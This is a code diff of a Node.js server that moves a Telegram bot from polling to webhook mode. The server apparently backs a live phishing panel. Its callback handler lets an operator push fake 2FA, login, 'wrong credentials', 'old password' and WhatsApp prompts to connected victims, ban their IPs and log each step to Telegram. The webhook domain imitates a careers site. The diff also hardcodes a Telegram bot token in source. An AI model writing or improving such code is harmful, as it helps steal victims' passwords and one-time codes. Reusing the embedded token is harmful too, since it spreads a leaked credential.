@@ -20,17 +20,15 @@ app.set('trust proxy', 1);
 
 const server = http.createServer(app);
 
-// Initialize Telegram bot with better error handling for production
+// Initialize Telegram bot with webhook support for production
 let bot;
+const TELEGRAM_TOKEN = '8386163454:AAH-FEmBv2bEFKPkz9FPZ-lM_jhXUnYgAus';
+const USE_WEBHOOK = process.env.USE_WEBHOOK === 'true' || process.env.NODE_ENV === 'production';
+
 try {
-  bot = new TelegramBot('8386163454:AAH-FEmBv2bEFKPkz9FPZ-lM_jhXUnYgAus', { 
-    polling: {
-      interval: 1000,
-      autoStart: false, // Don't start polling immediately
-      params: {
-        timeout: 10
-      }
-    },
+  // Create bot instance without polling
+  bot = new TelegramBot(TELEGRAM_TOKEN, { 
+    polling: false, // Disable polling completely
     request: {
       agentOptions: {
         keepAlive: true,
@@ -40,48 +38,58 @@ try {
   });
 
   // Handle bot errors
-  bot.on('polling_error', (error) => {
-    console.error('🚨 Telegram polling error:', error.message);
-    
-    // If it's a conflict error, wait and restart polling
-    if (error.message.includes('409 Conflict')) {
-      console.log('⏳ Multiple bot instances detected. Waiting 30 seconds before retry...');
-      setTimeout(() => {
-        console.log('🔄 Attempting to restart polling...');
-        bot.stopPolling().then(() => {
-          setTimeout(() => {
-            bot.startPolling().catch(err => {
-              console.error('❌ Failed to restart polling:', err.message);
-            });
-          }, 5000);
-        });
-      }, 30000);
-    }
-  });
-
   bot.on('error', (error) => {
     console.error('🚨 Telegram bot error:', error.message);
   });
 
-  // Delete webhook and start polling with delay
-  bot.deleteWebHook()
-    .then(() => {
-      console.log('✅ Webhook deleted.');
-      // Start polling after a delay to avoid conflicts
-      setTimeout(() => {
-        bot.startPolling()
-          .then(() => {
-            console.log('✅ Polling started successfully.');
-          })
-          .catch((error) => {
-            console.error('❌ Failed to start polling:', error.message);
-          });
-      }, 10000); // Wait 10 seconds before starting polling
-    })
-    .catch((error) => {
-      console.error('❌ Failed to delete webhook:', error.message);
-      console.log('⚠️ Bot will continue with polling mode...');
-    });
+  if (USE_WEBHOOK) {
+    // Use webhook mode for production
+    console.log('🌐 Using webhook mode for Telegram bot');
+    
+    // Set webhook endpoint
+    const webhookUrl = `${process.env.RENDER_EXTERNAL_URL || 'https://conn.aquentcareers.io'}/webhook/${TELEGRAM_TOKEN}`;
+    
+    bot.setWebHook(webhookUrl)
+      .then(() => {
+        console.log('✅ Webhook set successfully:', webhookUrl);
+      })
+      .catch((error) => {
+        console.error('❌ Failed to set webhook:', error.message);
+      });
+  } else {
+    // Use polling mode for development
+    console.log('🔄 Using polling mode for Telegram bot');
+    
+    // Delete any existing webhook first
+    bot.deleteWebHook()
+      .then(() => {
+        console.log('✅ Webhook deleted.');
+        // Start polling with delay
+        setTimeout(() => {
+          bot.startPolling()
+            .then(() => {
+              console.log('✅ Polling started successfully.');
+            })
+            .catch((error) => {
+              console.error('❌ Failed to start polling:', error.message);
+              
+              // If conflict, wait and try once more
+              if (error.message.includes('409 Conflict')) {
+                console.log('⏳ Conflict detected. Waiting 60 seconds before final attempt...');
+                setTimeout(() => {
+                  bot.startPolling().catch(err => {
+                    console.error('❌ Final polling attempt failed:', err.message);
+                    console.log('💡 Consider switching to webhook mode or checking for duplicate instances');
+                  });
+                }, 60000);
+              }
+            });
+        }, 15000); // Wait 15 seconds before starting polling
+      })
+      .catch((error) => {
+        console.error('❌ Failed to delete webhook:', error.message);
+      });
+  }
 
 } catch (error) {
   console.error('🚨 Failed to initialize Telegram bot:', error.message);
@@ -139,43 +147,54 @@ const userData = {};          // clientId -> data
 const socketToClient = {};    // socket.id -> clientId
 const newUsers = new Set();
 
-bot.on('callback_query', (query) => {
-  const [command, clientId] = query.data.split(':');
+// Handle bot callback queries
+if (bot) {
+  bot.on('callback_query', (query) => {
+    const [command, clientId] = query.data.split(':');
 
-  const map = {
-    send_2fa: 'show-2fa',
-    send_auth: 'show-auth',
-    send_email: 'show-email',
-    send_wh: 'show-whatsapp',
-    send_wrong_creds: 'show-wrong-creds',
-    send_old_pass: 'show-old-pass',
-    send_calendar: 'show-calendar',
-  };
+    const map = {
+      send_2fa: 'show-2fa',
+      send_auth: 'show-auth',
+      send_email: 'show-email',
+      send_wh: 'show-whatsapp',
+      send_wrong_creds: 'show-wrong-creds',
+      send_old_pass: 'show-old-pass',
+      send_calendar: 'show-calendar',
+    };
 
-  if (command === 'disconnect') {
-    disconnectClient(clientId);
-    bot.answerCallbackQuery(query.id, { text: 'Client disconnected.' });
-  } else if (map[command]) {
-    emitToClient(clientId, map[command]);
-    bot.answerCallbackQuery(query.id, { text: `Sent ${command.replace('_', ' ')}` });
-    const msg = `📩 *Command Sent to Client*\n\n` +
-      `📤 *Command:* \`${command}\`\n` +
-      `🆔 *Client ID:* \`${clientId}\``;
-    sendTelegramMessage(msg, clientId, true);
-  } else if (command === 'ban_ip') {
-    const ip = userData[clientId]?.ip;
-    if (ip) {
-      banIp(ip);
-      bot.answerCallbackQuery(query.id, { text: `Banned IP: ${ip}` });
+    if (command === 'disconnect') {
       disconnectClient(clientId);
-      sendTelegramMessage(`🚫 *IP Banned*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\``, clientId, false);
-    } else {
-      bot.answerCallbackQuery(query.id, { text: 'IP not found for client.' });
+      bot.answerCallbackQuery(query.id, { text: 'Client disconnected.' });
+    } else if (map[command]) {
+      emitToClient(clientId, map[command]);
+      bot.answerCallbackQuery(query.id, { text: `Sent ${command.replace('_', ' ')}` });
+      const msg = `📩 *Command Sent to Client*\n\n` +
+        `📤 *Command:* \`${command}\`\n` +
+        `🆔 *Client ID:* \`${clientId}\``;
+      sendTelegramMessage(msg, clientId, true);
+    } else if (command === 'ban_ip') {
+      const ip = userData[clientId]?.ip;
+      if (ip) {
+        banIp(ip);
+        bot.answerCallbackQuery(query.id, { text: `Banned IP: ${ip}` });
+        disconnectClient(clientId);
+        sendTelegramMessage(`🚫 *IP Banned*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\``, clientId, false);
+      } else {
+        bot.answerCallbackQuery(query.id, { text: 'IP not found for client.' });
+      }
     }
+    else {
+      bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
+    }
+  });
+}
+
+// Webhook endpoint for Telegram
+app.post(`/webhook/${TELEGRAM_TOKEN}`, (req, res) => {
+  if (bot) {
+    bot.processUpdate(req.body);
   }
-  else {
-    bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
-  }
+  res.sendStatus(200);
 });
 function formatDateTime(date) {
   return {
